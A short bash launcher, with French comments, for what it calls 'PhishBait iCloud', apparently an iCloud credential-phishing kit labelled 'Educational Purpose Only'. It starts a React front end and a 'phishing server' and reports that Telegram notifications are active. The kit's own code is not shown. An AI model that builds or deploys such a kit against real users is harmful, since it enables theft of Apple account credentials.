#!/bin/bash
clear
echo "🛡️ PhishBait iCloud - Educational Purpose Only 🛡️"
echo "=============================================="

# Vérification des variables d'environnement
if [ ! -f "server/.env" ]; then
  echo "❌ Fichier .env manquant dans server/"
  exit 1
fi

# Lancement des serveurs
echo "🌐 Démarrage du frontend React..."
npm run dev &

echo "🔌 Démarrage du serveur phishing..."
cd server
node server.js &

echo "=============================================="
echo "✅ Système opérationnel :"
echo "- Frontend: http://localhost:5173"
echo "- Backend: http://localhost:3001"
echo "- Telegram: notifications activées"

# Nettoyage à la sortie
trap "pkill -f 'node server.js'; exit" SIGINT
wait
